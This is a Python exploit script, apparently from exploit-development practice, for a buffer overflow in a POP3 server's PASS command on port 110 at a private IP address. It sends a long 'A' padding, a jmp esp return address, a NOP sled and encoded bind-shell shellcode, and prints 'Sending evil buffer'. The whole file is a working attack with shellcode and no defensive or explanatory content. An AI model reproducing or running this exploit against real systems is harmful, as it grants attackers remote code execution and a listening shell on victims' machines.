#!/usr/bin/python 
# Name: Rio Atmadja

import struct
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ret = "\x53\x93\x42\x7e" #0x7e429353 jmp esp

#bad char: '\x00\x0a\x0d' payload: shell_bind_tcp
payload = ("\xdb\xcd\xba\x92\x97\x6f\x1f\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x4f\x83\xc0\x04\x31\x50\x15\x03\x50\x15\x70\x62\x93\xf7\xfd"
"\x8d\x6c\x08\x9d\x04\x89\x39\x8f\x73\xd9\x68\x1f\xf7\x8f\x80"
"\xd4\x55\x24\x12\x98\x71\x4b\x93\x16\xa4\x62\x24\x97\x68\x28"
"\xe6\xb6\x14\x33\x3b\x18\x24\xfc\x4e\x59\x61\xe1\xa1\x0b\x3a"
"\x6d\x13\xbb\x4f\x33\xa8\xba\x9f\x3f\x90\xc4\x9a\x80\x65\x7e"
"\xa4\xd0\xd6\xf5\xee\xc8\x5d\x51\xcf\xe9\xb2\x82\x33\xa3\xbf"
"\x70\xc7\x32\x16\x49\x28\x05\x56\x05\x17\xa9\x5b\x54\x5f\x0e"
"\x84\x23\xab\x6c\x39\x33\x68\x0e\xe5\xb6\x6d\xa8\x6e\x60\x56"
"\x48\xa2\xf6\x1d\x46\x0f\x7d\x79\x4b\x8e\x52\xf1\x77\x1b\x55"
"\xd6\xf1\x5f\x71\xf2\x5a\x3b\x18\xa3\x06\xea\x25\xb3\xef\x53"
"\x83\xbf\x02\x87\xb5\x9d\x4a\x64\x8b\x1d\x8b\xe2\x9c\x6e\xb9"
"\xad\x36\xf9\xf1\x26\x90\xfe\xf6\x1c\x64\x90\x08\x9f\x94\xb8"
"\xce\xcb\xc4\xd2\xe7\x73\x8f\x22\x07\xa6\x1f\x73\xa7\x19\xdf"
"\x23\x07\xca\xb7\x29\x88\x35\xa7\x51\x42\x40\xe0\xc6\xad\xfb"
"\xe4\x17\x46\xfe\xf8\x06\xca\x77\x1e\x42\xe2\xd1\x89\xfb\x9b"
"\x7b\x41\x9d\x64\x56\xc1\x3e\xf6\x3d\x11\x48\xeb\xe9\x46\x1d"
"\xdd\xe3\x02\xb3\x44\x5a\x30\x4e\x10\xa5\xf0\x95\xe1\x28\xf9"
"\x58\x5d\x0f\xe9\xa4\x5e\x0b\x5d\x79\x09\xc5\x0b\x3f\xe3\xa7"
"\xe5\xe9\x58\x6e\x61\x6f\x93\xb1\xf7\x70\xfe\x47\x17\xc0\x57"
"\x1e\x28\xed\x3f\x96\x51\x13\xa0\x59\x88\x97\xd0\x13\x90\xbe"
"\x78\xfa\x41\x83\xe4\xfd\xbc\xc0\x10\x7e\x34\xb9\xe6\x9e\x3d"
"\xbc\xa3\x18\xae\xcc\xbc\xcc\xd0\x63\xbc\xc4")

buffer = '\x41' * 4654 + ret + '\x90' * 16 + payload 
print "\nSending evil buffer..."
s.connect(('192.168.10.101',110))
data = s.recv(1024)
s.send('USER username' +'\r\n')
data = s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
data = s.recv(1024)
s.close()
print "\nDone! "
